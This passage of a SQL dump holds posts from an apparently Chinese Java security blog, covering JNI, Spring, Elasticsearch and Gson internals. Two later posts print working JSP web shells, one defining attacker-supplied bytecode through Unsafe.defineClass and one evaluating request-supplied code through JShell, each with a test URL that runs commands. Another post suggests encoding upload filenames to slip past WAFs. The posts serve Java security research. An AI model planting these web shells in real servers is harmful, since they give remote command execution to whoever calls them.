&lt;jni.h&gt;</strong>为<strong>#include \"jni.h\"</strong> \r\n</div>\r\n<img src=\"http://p2j.cn/uploads/image/20180523/20180523080129_329.png\" alt=\"\" width=\"600\" height=\"326\" title=\"\" align=\"\" /> \r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n新建<strong>org_javaweb_jni_Test.c</strong>并编译lib库:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180523/20180523080224_125.png\" alt=\"\" width=\"600\" height=\"346\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n</p>\r\n<div>\r\n	编译test库,库名称必须是“<strong>lib***.jnilib</strong>”。\r\n</div>\r\n<div>\r\n	gcc org_javaweb_jni_Test.c -shared -fPIC -o libtest.jnilib\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	复制编译后的test库到java动态链接库:\r\n</div>\r\n<div>\r\n	cp libtest.jnilib /Users/yz/Library/Java/Extensions/\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	通过System.getProperty(\"java.library.path\")可以获取链接库目录,也可以<a href=\"https://blog.csdn.net/quqibing001/article/details/51201768\">自行设置java.library.path的路径</a>。\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<div>\r\n	最后执行<strong>Test.java</strong>：&nbsp;\r\n</div>\r\n<img src=\"http://p2j.cn/uploads/image/20180523/20180523080339_212.png\" alt=\"\" width=\"600\" height=\"394\" title=\"\" align=\"\" /> \r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	注意:JDK10移除了javah,需要改为javac加参数。例如:javac -h -cp jna.jar com/sun/jna/Function.java\r\n</p>\r\n<p>\r\n	参考:\r\n</p>\r\n<div>\r\n	<a href=\"https://blog.csdn.net/huachao1001/article/details/53906237\">https://blog.csdn.net/huachao1001/article/details/53906237</a> \r\n</div>\r\n<p>\r\n	<br />\r\n</p>', null, '2018-05-23 08:09:31', '1', '1127', '', '0', '2018-05-23 08:09:31'), ('1867', '1', '33', 'Spring Boot 2.x JPA 不能够添加自定义Repository', '园长', '<p>\r\n	升级Spring Boot版本后出现了大量的问题，升级到新版的Spring data JPA 会报错:\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostAPI\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostServiceImpl\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepositoryImpl\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepository\': Cannot create inner bean \'(inner bean)#9af3bdd\' of type [org.springframework.data.repository.core.support.RepositoryFragmentsFactoryBean] while setting bean property \'repositoryFragments\'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'(inner bean)#9af3bdd\': Invocation of init method failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepositoryCustomImplFragment\': Cannot resolve reference to bean \'sysPostRepositoryCustomImpl\' while setting constructor argument; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepositoryCustomImpl\': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name \'sysPostRepository\': FactoryBean threw exception on object creation; nested exception is java.lang.NullPointerException</pre>\r\n</p>\r\n<p>\r\n	解决办法是需要在自定义的仓库类上，添加<span>@NoRepositoryBean注解</span>:\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">@NoRepositoryBean\r\npublic interface SysPostRepositoryCustom {\r\n......\r\n\r\n}</pre>\r\n</p>\r\n<p>\r\n	问题详情参考:\r\n</p>\r\n<p>\r\n	https://stackoverflow.com/questions/44831103/spring-boot-jpa-unable-to-add-custom-repository/\r\n</p>\r\n<p>\r\n	https://jira.spring.io/browse/DATACMNS-1147\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', null, '2018-06-14 07:24:21', '1', '1066', '', '0', '2018-06-14 07:24:21'), ('1868', '1', '11', 'Spring MVC MultipartResolver特性-QP编码', '园长', '<p>\r\n	今天看Spring的Multipart处理发现一段比较奇怪的代码：\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180803/20180803094501_282.png\" alt=\"\" width=\"800\" height=\"358\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	奇怪的是Spring为什么会对“=?”、“?=”进行特殊处理？跟进后发现这玩意是QP编码，用来解决邮件内附件编码问题。Spring调用了java mail的api对文件上传的附件文件名称进行了QP编码。\r\n</p>\r\n<p>\r\n	既然已知Spring的这个特性，那么某些时候或许就可以通过对文件名称进行编码来绕过传统的waf、cdn的防御了。\r\n</p>\r\n<p>\r\n	利用Java mail库生成<span>特殊的</span>文件名：\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180803/20180803095634_331.png\" alt=\"\" width=\"500\" height=\"371\" title=\"\" align=\"\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	上传进行编码后的文件：\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180803/20180803095001_3.png\" alt=\"\" width=\"500\" height=\"145\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	Spring会做decode解析：\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20180803/20180803094605_47.png\" alt=\"\" width=\"800\" height=\"389\" title=\"\" align=\"\" /> \r\n</p>', null, '2018-08-03 09:47:51', '1', '1075', '', '5', '2018-08-03 09:47:51'), ('1869', '1', '11', '修改Spring Data Elasticsearch 对象序列化方式', '园长', '<p>\r\n	Spring Data Elasticsearch默认采用了Jackson作为对象序列化方式,但是为了保持Json序列化一致性就不得不修改Spring Data Elasticsearch的序列化结果了，这里讲下如何使用的是Fastjson来序列化Spring Data Elasticsearch查询出来的数据。\r\n</p>\r\n<p>\r\n	Spring Data Elasticsearch中，默认会调用org.springframework.data.elasticsearch.core.DefaultResultMapper来映射ElasticSearch返回的结果，而最终序列化方法在<span>DefaultResultMapper的父类org.springframework.data.elasticsearch.core.AbstractResultMapper的publicT mapEntity(String source, Classclazz)方法，所以只需要想办法重写<span>mapEntity方法就行了</span></span>。\r\n</p>\r\n<p>\r\n	在Spring Boot项目中定义下自定义的ElasticsearchTemplate就可以实现自定义<span>ResultMapper了</span>:\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">@Bean(\"elasticsearchTemplate\")\r\npublic ElasticsearchTemplate elasticsearchTemplate(Client client) {\r\n	SimpleElasticsearchMappingContext mappingContext = new SimpleElasticsearchMappingContext();\r\n	return new ElasticsearchTemplate(\r\n			client,\r\n			new MappingElasticsearchConverter(mappingContext),\r\n			new DefaultResultMapper() {\r\n				public &lt;T&gt; T mapEntity(String source, Class&lt;T&gt; clazz) {\r\n					return JSON.parseObject(source, clazz);\r\n				}\r\n			}\r\n	);\r\n}</pre>\r\n</p>\r\n重启服务即可。\r\n<p>\r\n	<br />\r\n</p>', null, '2018-10-17 08:48:45', '1', '1139', '', '2', '2018-10-17 08:48:45'), ('1870', '1', '11', 'Spring MVC 5.X Debug', '园长', '<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n<p>\r\n	web.xml初始化\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20181026/20181026071155_87.png\" alt=\"\" width=\"638\" height=\"451\" title=\"\" align=\"\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n	<div>\r\n		&nbsp; &nbsp; &nbsp; &nbsp; web.xml需要配置Spring的listener(ContextLoaderListener)，ContextLoaderListener是Spring的初始化加载类，如果未在web.xml中配置“<span style=\"font-size:14px;font-family:-apple-system, &quot;\">context-param</span>”，默认会优先加载“/WEB-INF/”下加载applicationContext.xml。\r\n	</div>\r\n	<div>\r\n		<br />\r\n	</div>\r\n	<div>\r\n		<span>&nbsp;&nbsp; &nbsp;SpringMVC实现方式是Servlet，通过在web.xml配置DispatcherServlet,所有的请求都会先经过Spring处理。</span>\r\n	</div>\r\n	<div>\r\n		<br />\r\n	</div>\r\n	<div>\r\n		<span>&nbsp;&nbsp; &nbsp;Spring MVC是一个架构上非常复杂的框架，经过抽象后的DispatcherServlet就会显得比较复杂了。但是从根本上来说DispatcherServlet就是一个普通的Servlet，所以它处理Http请求的方式就必然是重写Servlet的doXXX或service方法。</span>\r\n	</div>\r\n	<p>\r\n		<img src=\"http://p2j.cn/uploads/image/20181026/20181026071238_827.png\" alt=\"\" width=\"610\" height=\"326\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->&nbsp; &nbsp; &nbsp;从类图可以看到，FrameworkServlet类是DispatcherServlet第一个父类，这个类也是重写了所有的Http请求方法(七种Http请求方式)，以及Servlet提供的service方法:\r\n	</p>\r\n	<p>\r\n		<img src=\"http://p2j.cn/uploads/image/20181026/20181026071327_961.png\" alt=\"\" width=\"668\" height=\"265\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n&nbsp; &nbsp; 在Servlet中，所有的请求方法都会先经过service方法，然后才会进入具体的doXXXX方法。\r\n	</p>\r\n	<p>\r\n		<img src=\"http://p2j.cn/uploads/image/20181026/20181026071400_485.png\" alt=\"\" width=\"542\" height=\"212\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n不过Spring MVC中并没有直接在service方法中处理请求的，而是在具体的请求方法，比如doPost方法：\r\n	</p>\r\n	<p>\r\n		<img src=\"http://p2j.cn/uploads/image/20181026/20181026071456_120.png\" alt=\"\" width=\"682\" height=\"483\" title=\"\" align=\"\" />\r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n		<div>\r\n			从上图可以看到，所有的doXXX方法都会进入processRequest方法。而processRequest方法会直接回调DispatcherServlet类的doService方法。\r\n		</div>\r\n		<div>\r\n			doService经过初始化后会调用doDispatch方法来完成MVC的请求分发。Spring 5支持请求异步处理，这里暂且跳过相关分析。\r\n		</div>\r\n		<div>\r\n			<br />\r\n		</div>\r\n		<div>\r\n			doDispatch方法是整个MVC处理的核心，大致逻辑如下：\r\n		</div>\r\n		<div>\r\n			<br />\r\n		</div>\r\n		<ol>\r\n			<li>\r\n				<div>\r\n					checkMultipart 检测是否是Multipart请求(文件上传请求)，如果是Multipart请求需要解析表单域内容并封装成一个包含了文件信息和表单内容的特殊的request对象(StandardMultipartHttpServletRequest)。StandardMultipartHttpServletRequest类实现了MultipartHttpServletRequest接口，并继承了HttpServletRequestWrapper类(这个类是用于包装HttpRequest请求对象的，如果想修改request的方法类需要继承此类并重写对应的方法)，StandardMultipartHttpServletRequest类内部还实现了对文件上传的请求解析(parseRequest方法)、对request对象进行包装(主要重写了getParameterMap、getParameterNames方法不然无法从request中获取表单域中的参数值)。\r\n				</div>\r\n			</li>\r\n			<li>\r\n				查找请求处理器mappedHandler,getHandler(processedRequest);这个方法是获取当前request的处理器的，往深了跟会发现handler是有很多类型的(RequestMappingHandlerMapping、BeanNameUrlHandlerMapping、DelegatingHandlerMapping、EmptyHandlerMapping)，保存在handlerMappings对象中的。跟进到AbstractHandlerMapping类的getHandler方法能看到获取handler的内部细节，其中调用类getHandlerInternal方法，这个方法内部调用了AbstractHandlerMethodMapping类的lookupHandlerMethod方法来查找请求URL地址对应的handler。通过addMatchingMappings处理后matches对象就会记录url地址和对应的具体的handler，用于后面的handler调用。其实Spring MVC的所有mapping的配置信息都是保存在了mappingRegistry对象中。如果一个url地址找到了多个handler，那么Spring MVC会从中挑选一个最佳匹配(bestMatch)的handler来处理请求。\r\n			</li>\r\n			<li>\r\n				getHandlerAdapter方法会从上面找到的handler中找到一个合适的适配器类型，handlerAdapters分为RepositoryRestHandlerAdapter、RequestMappingHandlerAdapter、HttpRequestHandlerAdapter、SimpleControllerHandlerAdapter。\r\n			</li>\r\n			<li>\r\n				处理Http请求中的last-modified(只支持GET、Head请求)。\r\n			</li>\r\n			<li>\r\n				调用mappedHandler,处理Spring的拦截器(applyPreHandle方法),这里会加载用户自定义的拦截器(优先)以及内置的拦截器并调用其preHandle方法，根据拦截器的处理结果(true,false)来决定mvc请求是否继续执行，这也是为什么在拦截器preHandle方法中一定要返回正确的值，因为如果返回false程序是不会进任何的Controller方法执行就会结束掉http请求的。\r\n			</li>\r\n			<li>\r\n				根据getHandlerAdapter找到的适配器结果处理mvc请求，比如找到的适配器类型是RequestMappingHandlerAdapter，那么就会调用RequestMapping的handler处理逻辑去处理handler。具体的处理逻辑在RequestMappingHandlerAdapter类的handleInternal方法调用的invokeHandlerMethod、ServletInvocableHandlerMethod类的invokeAndHandle方法，处理完成后返回ModelAndView。Spring Controller的方法参数值是在AbstractMessageConverterMethodArgumentResolver类的readWithMessageConverters方法处理的，Spring默认有8种参数转换器(在messageConverters变量中定义的:ByteArrayHttpMessageConverter、StringHttpMessageConverter、ResourceHttpMessageConverter、ResourceRegionHttpMessageConverter、SourceHttpMessageConverter、AllEncompassingFormHttpMessageConverter、Jaxb2RootElementHttpMessageConverter、MappingJackson2HttpMessageConverter)用于参数值自动映射。顺便解答下为什么json只能映射一个参数？因为Spring根本就不考虑多参数的json映射这类情况，AbstractJackson2HttpMessageConverter类的readJavaType方法中直接调用了Jackson的json序列化，而参数就是request的InputStream，所以这个in被Jackson读取了就无法再次渲染了。\r\n			</li>\r\n			<li>\r\n				如果handler处理结果返回的ModelAndView中未包含view，设置applyDefaultViewName。\r\n			</li>\r\n			<li>\r\n				依次调用拦截器的postHandle方法。\r\n			</li>\r\n			<li>\r\n				处理handler执行结果，processDispatchResult，如果有ModelAndView就渲染view、调用拦截器的afterCompletion方法。\r\n			</li>\r\n			<li>\r\n				结束doDispatch逻辑，请求处理完成。\r\n			</li>\r\n		</ol>\r\n	</p>\r\n</p>', null, '2018-10-26 07:15:29', '1', '1012', '', '8', '2018-10-26 07:15:29'), ('1871', '1', '14', 'Java Web安全-代码审计系列文章', '园长', '<p>\r\n	这个Java代码审计系列是年前公司内部最后一次技术分享，开源到了Github(<span>包含了代码和文章</span>)也在凌天实验室公众号发布过，因为时间不够并未写完，年后若有时间会将剩下的部分完成。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	Git地址:&nbsp;<a href=\"https://github.com/anbai-inc/javaweb-codereview\" target=\"_blank\">javaweb-codereview</a>\r\n</p>\r\n<p>\r\n	文章地址:&nbsp;<a href=\"https://github.com/anbai-inc/javaweb-codereview/blob/master/JavaSecureCodeReview.md\" target=\"_blank\">JavaSecureCodeReview</a>\r\n</p>', null, '2019-01-31 12:48:08', '1', '1187', '', '0', '2019-01-31 12:48:08'), ('1872', '1', '3', 'Gson sun.misc.Unsafe.allocateInstance序列化Java对象', '园长', '<p>\r\n	最近使用Fastjson的时候遇到一个类无空构造方法导致无法反序列化类对象,试了下Fastjson和Jackson都无法创建，而Gson确可以无视构造方法反序列化对象。\r\n</p>\r\n<p>\r\n	<b>测试类:TestRequest.java</b> \r\n</p>\r\n<pre class=\"brush: java; gutter: true\">public class TestRequest implements Serializable {\r\n\r\n	private String method;\r\n\r\n	private String queryString;\r\n\r\n	private String requestURI;\r\n\r\n	public TestRequest(HttpServletRequest request) {\r\n		this.method = request.getMethod();\r\n		this.queryString = request.getQueryString();\r\n		this.requestURI = request.getRequestURI();\r\n	}\r\n\r\n        .......省略get/set方法\r\n}</pre>\r\n<br />\r\n<p>\r\n	跟了下Gson的序列化方式发现它封装了一个com.google.gson.internal.UnsafeAllocator类，见名知意，原来Gson使用sun.misc.Unsafe的allocateInstance方法来绕过了构造方法限制创建实例。熟悉Java安全的小伙伴儿应该都对<span>sun.misc.Unsafe有所了解，<span>Unsafe可以绕过很多JVM的限制，但如它名字一样这个类是不安全的，<span>Unsafe大多数方法都是调用了JNI的native方法实现的</span>。</span></span>\r\n</p>\r\n<p>\r\n	而Fastjson和Jackson应该都是使用了Java的反射机制来创建类示例的，其中的Fastjson自作聪明的给无空构造方法的类都传递了一个null变量,在一定程度上还是能成功创建类实例，但是比较鸡肋，真是伤脑筋.\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', null, '2019-01-31 23:43:27', '1', '1297', '', '3', '2019-01-31 23:43:27'), ('1873', '1', '3', 'Java11之前使用sun.misc.Unsafe定义类对象', '园长', '<p>\r\n	上一篇文章写了如何使用Unsafe来创建任意类对象的实例，这篇文章接着写如何使用Unsafe来定义一个类对象。\r\n</p>\r\n<p>\r\n	正常情况下我们可以重写ClassLoader类来实现定义任意的类，但是某些时候我们无法通过自定义ClassLoader来定义类的时候可以使用这种方式来定义一个class，但是前提条件是在JDK11之前的版本。\r\n</p>\r\n<p>\r\n	如果我们需要定义一个名为com.anbai.lingxe.agent.AbTest的类可以使用如下方式：\r\n</p>\r\n<p>\r\n	com.anbai.lingxe.agent.AbTest示例代码如下：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">package com.anbai.lingxe.agent;\r\n\r\nimport java.io.IOException;\r\n\r\npublic class AbTest {\r\n\r\n	public static Process exec(String cmd) throws IOException {\r\n		return Runtime.getRuntime().exec(cmd);\r\n	} \r\n	\r\n}</pre>\r\n<p>\r\n	测试jsp代码：\r\n</p>\r\n<p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;\r\n&lt;%@ page import=\"sun.misc.BASE64Decoder\" %&gt;\r\n&lt;%@ page import=\"sun.misc.Unsafe\" %&gt;\r\n&lt;%@ page import=\"java.io.InputStream\" %&gt;\r\n&lt;%@ page import=\"java.lang.reflect.Field\" %&gt;\r\n&lt;%--\r\n    JDK11之前使用Unsafe来定义任意的类对象并通过反射调用类方法\r\n    测试方法: curl -i http://localhost:8080/modules/unsafe.jsp?bytes=yv66vgAAADIAHwcAAgEAHWNvbS9hbmJhaS9saW5neGUvYWdlbnQvQWJUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgEABENvZGUKAAMACQwABQAGAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAH0xjb20vYW5iYWkvbGluZ3hlL2FnZW50L0FiVGVzdDsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAKRXhjZXB0aW9ucwcAEgEAE2phdmEvaW8vSU9FeGNlcHRpb24KABQAFgcAFQEAEWphdmEvbGFuZy9SdW50aW1lDAAXABgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgAUABoMAA4ADwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAtBYlRlc3QuamF2YQAhAAEAAwAAAAAAAgABAAUABgABAAcAAAAvAAEAAQAAAAUqtwAIsQAAAAIACgAAAAYAAQAAAAUACwAAAAwAAQAAAAUADAANAAAACQAOAA8AAgAQAAAABAABABEABwAAADIAAgABAAAACLgAEyq2ABmwAAAAAgAKAAAABgABAAAACAALAAAADAABAAAACAAbABwAAAABAB0AAAACAB4%3D&amp;cmd=pwd\r\n--%&gt;\r\n&lt;%\r\n    String className = \"com.anbai.lingxe.agent.AbTest\";// 定义一个不存在的类\r\n    Class clazz = null;\r\n\r\n    try {\r\n        // 反射调用下,如果这个类已经被声明了就没必要再创建了\r\n        clazz = Class.forName(className);\r\n    } catch (ClassNotFoundException e) {\r\n        // base64解码请求参数后获取这个类的字节码\r\n        byte[] bytes = new BASE64Decoder().decodeBuffer(request.getParameter(\"bytes\"));\r\n\r\n        // 通过反射获取到Unsafe实例,因为无法直接通过Unsafe.getUnsafe()来获取实例\r\n        Field f = Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\r\n        f.setAccessible(true);\r\n\r\n        // 使用Unsafe.defineClass()方法来定义一个类\r\n        clazz = ((Unsafe) f.get(null)).defineClass(className, bytes, 0, bytes.length, getClass().getClassLoader(), null);\r\n    }\r\n\r\n    // 上面的逻辑如果没有错误就已经成功的拿到需要创建的类对象了,所以接下来只需要调用类方法就可以了.\r\n    // 这里调用com.anbai.lingxe.agent.AbTest.exec(cmd)方法,并输出命令执行结果\r\n    Process process = (Process) clazz.getMethod(\"exec\", String.class).invoke(null, request.getParameter(\"cmd\"));\r\n    InputStream in = process.getInputStream();\r\n    java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\A\");\r\n    out.println(s.hasNext() ? s.next() : \"\");\r\n%&gt;</pre>\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	请求jsp测试类创建和调用结果：\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20190910/20190910150958_332.png\" alt=\"\" width=\"600\" height=\"88\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	测试访问：\r\n<pre><span style=\"color:#808080;font-style:italic;\">http://localhost:8080/modules/unsafe.jsp?bytes=yv66vgAAADIAHwcAAgEAHWNvbS9hbmJhaS9saW5neGUvYWdlbnQvQWJUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgEABENvZGUKAAMACQwABQAGAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAH0xjb20vYW5iYWkvbGluZ3hlL2FnZW50L0FiVGVzdDsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAKRXhjZXB0aW9ucwcAEgEAE2phdmEvaW8vSU9FeGNlcHRpb24KABQAFgcAFQEAEWphdmEvbGFuZy9SdW50aW1lDAAXABgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgAUABoMAA4ADwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAtBYlRlc3QuamF2YQAhAAEAAwAAAAAAAgABAAUABgABAAcAAAAvAAEAAQAAAAUqtwAIsQAAAAIACgAAAAYAAQAAAAUACwAAAAwAAQAAAAUADAANAAAACQAOAA8AAgAQAAAABAABABEABwAAADIAAgABAAAACLgAEyq2ABmwAAAAAgAKAAAABgABAAAACAALAAAADAABAAAACAAbABwAAAABAB0AAAACAB4%3D&amp;cmd=pwd</span></pre>\r\n</p>\r\n<p>\r\n	新版本的JDK已经把这个native方法移除了，可以使用使用java.lang.invoke.MethodHandles.Lookup.defineClass来代替，<span>MethodHandles不过是间接的调用了ClassLoader的<span>defineClass罢了，所以就没得玩了，</span></span>这个<span>Unsafe的<span>defineClass</span></span>实现代码：\r\n</p>\r\n<p>\r\n	<a href=\"https://github.com/unofficial-openjdk/openjdk/blob/7be094e012bd92bdf66c04450a36f9b4f7dad1cb/src/hotspot/share/prims/unsafe.cpp#L657\" target=\"_blank\">https://github.com/unofficial-openjdk/openjdk/blob/7be094e012bd92bdf66c04450a36f9b4f7dad1cb/src/hotspot/share/prims/unsafe.cpp#L657</a>\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', null, '2019-09-10 15:12:23', '1', '70', '', '0', '2019-09-10 15:12:23');
INSERT INTO `sys_posts` VALUES ('1874', '1', '3', 'JShell(JDK9+) eval 任意Java代码片段执行', '园长', '<p>\r\n	最近几年开发RASP产品期间整理了很多的Java语言的特性，不过一直都没有时间写文章，可能真的是变懒了吧～\r\n</p>\r\n<p>\r\n	<span>JDK9</span>开始提供了一个叫jshell的功能，让开发者可以想python和php一样在命令行下愉快的写测试代码了。JDK9已经发布距今(2019年9月)了2年时间了，但在生产环境下使用JDK8以上的应用依旧寥寥无几。不过我们只需要利用这一特性其实是可以实现任意代码执行了，也就是说正真意义上的原生的java一句话木马实现了。\r\n</p>\r\n<p>\r\n	测试代码：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(\"src\"))%&gt;</pre>\r\n<p>\r\n	就这么简单的一行代码就可以了，src参数值是java代码片段。\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20190910/20190910185302_297.png\" alt=\"\" width=\"900\" height=\"104\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	测试用例：<a href=\"http://localhost:8080/modules/jshell.jsp?src=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(Runtime.getRuntime().exec(%22pwd%22).getInputStream())).readLine()\">http://localhost:8080/modules/jshell.jsp?src=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(Runtime.getRuntime().exec(%22pwd%22).getInputStream())).readLine()</a> \r\n</p>\r\n<p>\r\n	如果强迫症想撸掉多余的输出：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">&lt;%=jdk.jshell.JShell.builder().build().eval(request.getParameter(\"src\")).get(0).value().replaceAll(\"^\\\"\", \"\").replaceAll(\"\\\"$\", \"\")%&gt;</pre>', null, '2019-09-10 18:56:13', '1', '92', '', '1', '2019-09-10 18:56:13');
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
